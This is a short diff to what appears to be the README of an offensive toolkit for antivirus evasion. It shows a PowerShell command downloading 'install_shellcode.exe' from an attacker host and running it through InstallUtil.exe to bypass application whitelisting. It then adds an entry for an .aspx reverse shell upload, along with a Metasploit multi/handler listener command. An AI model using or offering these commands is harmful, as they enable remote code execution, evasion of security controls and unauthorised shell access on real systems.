@@ -70,6 +70,11 @@ iwr -uri 'http://$ip/install_shellcode.exe' -outfile C:/asd/install_shellcode.ex
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U install_shellcode.exe
 ```
 
+* shell.aspx - simple reverse shell for .aspx upload.
+```
+sudo msfconsole -x "use multi/handler; set LHOST tun0;set LPORT 443; exploit -j;"
+```
+
 ## SCORE 
 <p align="center">
   <img src="antiscanme.png" />
